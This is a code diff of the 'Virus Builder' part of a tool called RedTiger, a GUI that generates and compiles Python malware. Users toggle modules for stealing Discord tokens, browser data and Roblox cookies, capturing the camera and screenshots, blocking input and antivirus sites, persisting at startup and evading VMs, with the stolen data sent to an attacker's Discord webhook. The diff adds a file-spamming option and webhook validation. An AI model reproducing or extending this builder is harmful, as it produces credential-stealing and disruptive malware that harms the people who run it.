@@ -28,12 +28,12 @@ except Exception as e:
 Title("Virus Builder")
 
 try:
-# ╔═══════════File detected by the antivirus, but be aware that there is no backdoor═══════════╗
-# ║                                                                                            ║
-    from FileDetectedByAntivirus.VirusBuilderOptions import *                                # ║
-    disinfect_path = "./Settings/Program/FileDetectedByAntivirus/VirusBuilderDisinfect.py"   # ║
-# ║                                                                                            ║ 
-# ╚═══════════File detected by the antivirus, but be aware that there is no backdoor═══════════╝
+# ╔═══════════════════════════File detected by the antivirus, but be aware that there is no backdoor═══════════════════════════╗
+# ║                                                                                                                            ║
+    from FileDetectedByAntivirus.VirusBuilderOptions import *                                                                # ║
+    disinfect_path = os.path.join(tool_path, "Settings", "Program", "FileDetectedByAntivirus", "VirusBuilderDisinfect.py")   # ║
+# ║                                                                                                                            ║ 
+# ╚═══════════════════════════File detected by the antivirus, but be aware that there is no backdoor═══════════════════════════╝
 
     def disinfect():
         try:
@@ -48,7 +48,7 @@ try:
         try:
             if sys.platform.startswith("win"):
                 root = tk.Tk()
-                root.iconbitmap('Img/RedTiger_icon.ico')
+                root.iconbitmap(os.path.join(tool_path, "Img", "RedTiger_icon.ico"))
                 root.withdraw()
                 root.attributes('-topmost', True)
                 icon_path = filedialog.askopenfilename(parent=root, title=f"{name_tool} {version_tool} | Choose an icon (.ico)", filetypes=[("ICO files", "*.ico")])
@@ -60,11 +60,17 @@ try:
 
     def convert_to_exe(file_python, path_destination, name_file, icon_path=None):
         
-        print(f"{BEFORE + current_time_hour() + AFTER} {WAIT} Uninstallation of pathlib. {reset}")
+        
         if sys.platform.startswith("win"):
+            print(f"{BEFORE + current_time_hour() + AFTER} {WAIT} Uninstallation of pathlib.. {reset}")
             os.system("python -m pip uninstall pathlib")
+            print(f"{BEFORE + current_time_hour() + AFTER} {WAIT} Upgrade pyinstaller.. {reset}")
+            os.system("python -m pip install --upgrade pyinstaller")
         elif sys.platform.startswith("linux"):
+            print(f"{BEFORE + current_time_hour() + AFTER} {WAIT} Uninstallation of pathlib.. {reset}")
             os.system("python3 -m pip3 uninstall pathlib")
+            print(f"{BEFORE + current_time_hour() + AFTER} {WAIT} Upgrade pyinstaller.. {reset}")
+            os.system("python3 -m pip3 install --upgrade pyinstaller")
 
         print(f"{BEFORE + current_time_hour() + AFTER} {WAIT} Converting to executable: {reset}")
 
@@ -82,8 +88,8 @@ try:
         
             try:
                 print(f"{BEFORE + current_time_hour() + AFTER} {WAIT} Removing temporary files from conversion.. {reset}")     
-                shutil.rmtree(f"./build")
-                os.remove(f"{name_file}.spec")
+                shutil.rmtree(os.path.join(tool_path, "build"))
+                os.remove(os.path.join(tool_path, f"{name_file}.spec"))
                 os.remove(file_python)
                 print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Temporary file removed.{reset}")
             except Exception as e:
@@ -91,7 +97,6 @@ try:
         
         except Exception as e:
             print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Error during conversion: {white + e}")
-
 
     def webhook_send(webhook):
         try:
@@ -112,6 +117,7 @@ try:
                 {"name": f"Block AV Website:", "value": f"""```{add_blockwebsite}```""", "inline": True},
                 {"name": f"Shutdown:", "value": f"""```{add_shutdown}```""", "inline": True},
                 {"name": f"Spam Open Program:", "value": f"""```{add_spamopenprograms}```""", "inline": True},
+                {"name": f"Spam Create File:", "value": f"""```{add_spamcreatefile}```""", "inline": True},
                 {"name": f"Fake Error:", "value": f"""```{add_fake_error}```""", "inline": True},
                 {"name": f"Launch At Startup:", "value": f"""```{add_startup}```""", "inline": True},
                 {"name": f"Restart Every 5min:", "value": f"""```{add_restart}```""", "inline": True},
@@ -136,9 +142,11 @@ try:
                 }), headers={'Content-Type': 'application/json'})
 
             if response.status_code == 404:
-                ErrorWebhook() 
+                return "Invalid"
+            else:
+                return "Valid"
         except:
-            ErrorWebhook()
+            return "Invalid"
 
     Slow(f"""{virus_banner}                                                                           
 {BEFORE + current_time_hour() + AFTER} {INFO} File detected by the antivirus, but be aware that there is no backdoor!  
@@ -159,7 +167,7 @@ try:
     root = tk.Tk()
     style = ttk.Style()
     if sys.platform.startswith("win"):
-        root.iconbitmap('Img/RedTiger_icon.ico')
+        root.iconbitmap(os.path.join(tool_path, "Img", "RedTiger_icon.ico"))
     root.title(f'{name_tool} {version_tool} | Virus Builder')
     if sys.platform.startswith("win"):
         width_window = 1030
@@ -226,7 +234,7 @@ try:
         fake_error_window.title(f"RedTiger {version_tool} | Fake Error")
 
         if sys.platform.startswith("win"):
-            fake_error_window.iconbitmap('Img/RedTiger_icon.ico')
+            fake_error_window.iconbitmap(os.path.join(tool_path, "Img", "RedTiger_icon.ico"))
         fake_error_window.geometry(f"300x180")
         fake_error_window.resizable(False, False)
 
@@ -315,6 +323,7 @@ try:
     add_blockwebsite = "Disable"
     add_shutdown = "Disable"
     add_spamopenprograms = "Disable"
+    add_spamcreatefile = "Disable"
     add_fake_error = "Disable"
     add_startup = "Disable"
     add_restart = "Disable"
@@ -337,6 +346,7 @@ try:
     add_blockwebsite_var = tk.StringVar(value="Disable")
     add_shutdown_var = tk.StringVar(value="Disable")
     add_spamopenprograms_var = tk.StringVar(value="Disable")
+    add_spamcreatefile_var = tk.StringVar(value="Disable")
     add_fake_error_var = tk.StringVar(value="Disable")
     add_startup_var = tk.StringVar(value="Disable")
     add_restart_var = tk.StringVar(value="Disable")
@@ -377,6 +387,7 @@ try:
     add_blockwebsite_cb = ttk.Checkbutton(root, text="[Admin] Block AV Website", variable=add_blockwebsite_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
     add_shutdown_cb = ttk.Checkbutton(root, text="Shutdown", variable=add_shutdown_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
     add_spamopenprograms_cb = ttk.Checkbutton(root, text="Spam Open Program", variable=add_spamopenprograms_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
+    add_spamcreatefile_cb = ttk.Checkbutton(root, text="Spam Create File", variable=add_spamcreatefile_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
     add_fake_error_cb = ttk.Checkbutton(root, text="Fake Error", variable=add_fake_error_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton', command=create_fake_error_window)
     add_startup_cb = ttk.Checkbutton(root, text="Launch at Startup", variable=add_startup_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
     add_restart_cb = ttk.Checkbutton(root, text="Restart Every 5min", variable=add_restart_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
@@ -387,15 +398,12 @@ try:
     add_blocktaskmanager_cb.grid(row=12, column=0, padx=(220, 20), sticky="w")
     add_blockwebsite_cb.grid(row=13, column=0, padx=(220, 20), sticky="w")
     add_shutdown_cb.grid(row=14, column=0, padx=(220, 20), sticky="w")
-    add_spamopenprograms_cb.grid(row=10, column=1, padx=(0, 0), sticky="w")
+    add_spamopenprograms_cb.grid(row=15, column=0, padx=(220, 20), sticky="w")
+    add_spamcreatefile_cb.grid(row=10, column=1, padx=(0, 0), sticky="w")
     add_fake_error_cb.grid(row=11, column=1, padx=(0, 0), sticky="w")
     add_startup_cb.grid(row=12, column=1, padx=(0, 0), sticky="w")
     add_restart_cb.grid(row=13, column=1, padx=(0, 0), sticky="w")
     add_antivmanddebug_cb.grid(row=14, column=1, padx=(0, 0), sticky="w")
-
-    text_altgr = tk.Label(root, text='''To cancel the Block Mouse and Block Key 
-    and Spam Open Program, press "Alt" + "Alt Gr"''', font=("Calibri", 12), background=background_color, foreground=text_color)
-    text_altgr.grid(row=15, column=1,pady=(15, 0), padx=(10, 0))
 
     def openuserprofile_state(*args):
         if add_screenshot_var.get() == "Enable":
@@ -409,41 +417,42 @@ try:
         if add_restart_var.get() == "Enable":
             if add_blockmouse_var.get() == "Enable":
                 add_blockmouse_var.set("Disable")
-                error_logs("The Restart and Block Mouse option are not compatible together.")
-
-        if add_spamopenprograms_var.get() == "Enable":
-            if add_blockmouse_var.get() == "Enable":
-                add_blockmouse_var.set("Disable")
-                error_logs("The Spam Open Program and Block Mouse option are not compatible together.")
+                error_logs("The \"Restart\" and \"Block Mouse\" option are not compatible together.")
 
     def restart_state(*args):
         if add_blockmouse_var.get() == "Enable":
             if add_restart_var.get() == "Enable":
                 add_restart_var.set("Disable")
-                error_logs("The Block Mouse and Restart option are not compatible together.")
+                error_logs("The \"Block Mouse\" and \"Restart\" option are not compatible together.")
 
-        if add_spamopenprograms_var.get() == "Enable":
+        elif add_spamopenprograms_var.get() == "Enable":
             if add_restart_var.get() == "Enable":
                 add_restart_var.set("Disable")
-                error_logs("The Spam Open Program and Restart option are not compatible together.")
+                error_logs("The \"Spam Open Program\" and \"Restart\" option are not compatible together.")
+        
+        elif add_spamcreatefile_var.get() == "Enable":
+            if add_restart_var.get() == "Enable":
+                add_restart_var.set("Disable")
+                error_logs("The \"Spam Create File\" and \"Restart\" option are not compatible together.")
 
     def spamopenprograms_state(*args):
-        if add_blockmouse_var.get() == "Enable":
-            if add_spamopenprograms_var.get() == "Enable":
-                add_spamopenprograms_var.set("Disable")
-                error_logs("The Block Mouse and Spam Open Program option are not compatible together.")
-
         if add_restart_var.get() == "Enable":
             if add_spamopenprograms_var.get() == "Enable":
                 add_spamopenprograms_var.set("Disable")
-                error_logs("The Restart and Spam Open Program option are not compatible together.")
+                error_logs("The \"Restart\" and \"Spam Open Program\" option are not compatible together.")
+
+    def spamcreatefile_state(*args):
+        if add_restart_var.get() == "Enable":
+            if add_spamcreatefile_var.get() == "Enable":
+                add_spamcreatefile_var.set("Disable")
+                error_logs("The \"Restart\" and \"Spam Create File\" option are not compatible together.")
 
     add_restart_var.trace("w", spamopenprograms_state)
     add_restart_var.trace("w", blockmouse_state)
-    add_blockmouse_var.trace("w", spamopenprograms_state)
+    add_restart_var.trace("w", spamcreatefile_state)
     add_blockmouse_var.trace("w", restart_state)
-    add_spamopenprograms_var.trace("w", blockmouse_state)
     add_spamopenprograms_var.trace("w", restart_state)
+    add_spamcreatefile_var.trace("w", restart_state)
     add_screenshot_var.trace("w", openuserprofile_state)
 
     # <<<<<<<<<< Button Style >>>>>>>>>>
@@ -503,7 +512,7 @@ try:
 
     # <<<<<<<<<< Build Button >>>>>>>>>>
     def Build_Settings():
-        global add_system, add_discord, add_discordinjection, add_browser, add_roblox, add_cameracapture, add_openuserprofilsettings, add_screenshot, add_blockkey, add_blockmouse, add_blocktaskmanager, add_blockwebsite, add_spamopenprograms, add_shutdown ,add_fake_error,  add_startup, add_restart, add_antivmanddebug, webhook, name_file, file_type
+        global add_system, add_discord, add_discordinjection, add_browser, add_roblox, add_cameracapture, add_openuserprofilsettings, add_screenshot, add_blockkey, add_blockmouse, add_blocktaskmanager, add_blockwebsite, add_spamopenprograms, add_spamcreatefile, add_shutdown ,add_fake_error,  add_startup, add_restart, add_antivmanddebug, webhook, name_file, file_type
         add_system = add_system_var.get()
         add_discord = add_discord_var.get()
         add_discordinjection = add_discordinjection_var.get()
@@ -518,6 +527,7 @@ try:
         add_blocktaskmanager = add_blocktaskmanager_var.get()
         add_shutdown = add_shutdown_var.get()
         add_spamopenprograms = add_spamopenprograms_var.get()
+        add_spamcreatefile = add_spamcreatefile_var.get()
         add_fake_error = add_fake_error_var.get()
         add_startup = add_startup_var.get()
         add_restart = add_restart_var.get()
@@ -551,15 +561,15 @@ try:
 
     width = 18
     print(f"""
-    {add_system          } System Info         {add_openuserprofilsettings} Open UserProfil     {add_fake_error    } Fake Error
-    {add_discord         } Discord Token       {add_blockkey              } Block Key           {add_startup       } Launch at Startup
-    {add_discordinjection} Discord Injection   {add_blockmouse            } Block Mouse         {add_restart       } Restart Every 5min
-    {add_browser         } Browser Steal       {add_blocktaskmanager      } Block Task Manager  {add_antivmanddebug} Anti VM & Debug
-    {add_roblox          } Roblox Cookie       {add_blockwebsite          } Block AV Website
+    {add_system          } System Info         {add_openuserprofilsettings} Open UserProfil     {add_spamcreatefile} Spam Create File
+    {add_discord         } Discord Token       {add_blockkey              } Block Key           {add_fake_error    } Fake Error
+    {add_discordinjection} Discord Injection   {add_blockmouse            } Block Mouse         {add_startup       } Launch at Startup
+    {add_browser         } Browser Steal       {add_blocktaskmanager      } Block Task Manager  {add_restart       } Restart Every 5min
+    {add_roblox          } Roblox Cookie       {add_blockwebsite          } Block AV Website    {add_antivmanddebug} Anti VM & Debug
     {add_cameracapture   } Camera Capture      {add_shutdown              } Shutdown
     {add_screenshot      } Screenshot          {add_spamopenprograms      } Spam Open Program
 
-    {red}Webhook   : {white + webhook[:100] + '.' * 3}
+    {red}Webhook   : [{white + webhook_send(webhook) + red}] {white + webhook[:90] + '.' * 3}
     {red}File Type : {white + file_type}
     {red}File Name : {white + name_file}""".replace(f"Enable", f"{BEFORE_GREEN}+{AFTER_GREEN}").replace(f"Disable", f"{BEFORE}x{AFTER}"))
     if icon_path:
@@ -568,8 +578,6 @@ try:
         else:
             icon_path_cut = icon_path
         print(f"    {red}Icon Path : {white + icon_path_cut}")
-
-    webhook_send(webhook)
 
     file_python_relative = f'\\1-Output\\VirusBuilder\\{name_file}.py'
     file_python = os.path.join(tool_path, "1-Output", "VirusBuilder", f"{name_file}.py")
@@ -580,62 +588,68 @@ try:
     try:
         with open(file_python, 'w', encoding='utf-8') as file:
 
-            if add_antivmanddebug in ['Enable']:
+            if add_antivmanddebug == 'Enable':
                 file.write(Ant1VM4ndD3bug)
 
             file.write(Obligatory.replace("%WEBHOOK_URL%", webhook))
 
-            if add_system in ['Enable']:
+            if add_system == 'Enable':
                 file.write(Sy5t3mInf0)
 
-            if add_discord in ['Enable']:
+            if add_discord == 'Enable':
                 file.write(Di5c0rdT0k3n)
 
-            if add_discordinjection in ['Enable']:
+            if add_discordinjection == 'Enable':
                 file.write(Di5c0rdIj3ct10n)
 
-            if add_browser in ['Enable']:
+            if add_browser == 'Enable':
                 file.write(Br0w53r5t341)
 
-            if add_roblox in ['Enable']:
+            if add_roblox == 'Enable':
                 file.write(R0b10xC00ki3)
 
-            if add_cameracapture in ['Enable']:
+            if add_cameracapture == 'Enable':
                 file.write(C4m3r4C4ptur3)
 
-            if add_openuserprofilsettings in ['Enable']:
+            if add_openuserprofilsettings == 'Enable':
                 file.write(Op3nU53rPr0fi1353tting5)
 
-            if add_screenshot in ['Enable']:
+            if add_screenshot == 'Enable':
                 file.write(Scr33n5h0t)
 
-            if add_blockkey in ['Enable']:
+            if add_blockkey == 'Enable':
                 file.write(B10ckK3y)
             
-            if add_blockmouse in ['Enable']:
+            if add_blockmouse == 'Enable':
                 file.write(B10ckM0u53)
             
-            if add_blocktaskmanager in ['Enable']:
+            if add_blocktaskmanager == 'Enable':
                 file.write(B10ckT45kM4n4g3r)
 
-            if add_blockwebsite in ['Enable']:
+            if add_blockwebsite == 'Enable':
                 file.write(B10ckW3b5it3)
 
-            if add_fake_error in ['Enable']:
+            if add_fake_error == 'Enable':
                 file.write(F4k33rr0r(fake_error_title, fake_error_message))
 
-            if add_spamopenprograms in ['Enable']:
+            if add_spamopenprograms == 'Enable':
                 file.write(Sp4m0p3nPr0gr4m)
 
-            if add_shutdown in ['Enable']:
+            if add_spamcreatefile == 'Enable':
+                file.write(Sp4mCr34tFil3)
+
+            if add_shutdown == 'Enable':
                 file.write(Shutd0wn)
 
-            if add_startup in ['Enable']:
+            if add_startup == 'Enable':
                 file.write(St4rtup)
 
             file.write(St4rt)
 
-            if add_restart in ['Enable']:
+            if add_spamopenprograms == 'Enable' or add_blockmouse == 'Enable' or add_spamcreatefile == 'Enable':
+                file.write(Sp4mOpti0ns)
+
+            if add_restart == 'Enable':
                 file.write(R3st4rt)
 
         print(f"\n{BEFORE + current_time_hour() + AFTER} {INFO} Python file created: {white + file_python_relative}")
